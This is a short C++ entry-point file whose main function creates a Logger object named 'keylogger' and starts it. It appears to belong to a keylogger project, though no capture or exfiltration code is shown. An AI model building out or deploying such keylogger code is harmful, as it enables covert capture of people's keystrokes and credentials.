#include <iostream>
#include <string>
#include <cstring>
#include <sys/types.h>
#include <sys/stat.h>
#include <unistd.h>
#include "error.h"
#include "system.h"
#include "utils.h"
#include "logger.h"


int main(int argc, char *argv[]){
    Logger *keylogger = new Logger();
    keylogger->start();
}